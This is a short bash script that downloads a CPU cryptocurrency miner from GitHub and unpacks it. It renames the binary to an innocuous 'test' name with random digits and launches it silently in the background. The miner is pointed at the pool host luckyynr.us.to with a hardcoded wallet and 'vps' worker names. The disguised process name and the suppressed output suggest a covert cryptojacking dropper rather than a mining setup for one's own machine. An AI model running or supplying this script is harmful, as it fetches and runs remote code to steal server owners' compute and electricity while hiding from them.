#!/bin/bash

kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)

wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz

tar -xzf dot

mv cpuminer-sse2 test$kolot

nohup ./test$kolot -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
